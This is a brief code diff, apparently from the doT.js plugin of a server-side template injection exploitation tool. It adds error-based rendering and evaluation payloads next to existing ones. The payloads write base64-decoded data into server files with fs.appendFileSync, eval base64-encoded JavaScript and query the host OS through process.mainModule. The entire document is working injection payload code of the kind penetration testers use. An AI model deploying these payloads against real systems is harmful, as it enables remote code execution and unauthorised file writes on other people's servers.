@@ -25,6 +25,10 @@ class Dot(javascript.Javascript):
                 'test_render': f'{{{{=typeof({rand.randints[0]})+{rand.randints[1]}}}}}',
                 'test_render_expected': f'number{rand.randints[1]}'
             },
+            'render_error': {
+                'header': """{{{{=''['x'][({header[0]}+{header[1]}).toString()+""",
+                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]}}}}""",
+            },
             'write': {
                 'call': 'inject',
                 'write': """{{{{=global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')}}}}""",
@@ -41,6 +45,9 @@ class Dot(javascript.Javascript):
             'evaluate': {
                 'evaluate': """{{{{=eval(Buffer('{code_b64p}', 'base64').toString())}}}}""",
                 'test_os': """global.process.mainModule.require('os').platform()""",
+            },
+            'evaluate_error': {
+                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
             },
             'execute': {
                 'call': 'evaluate',
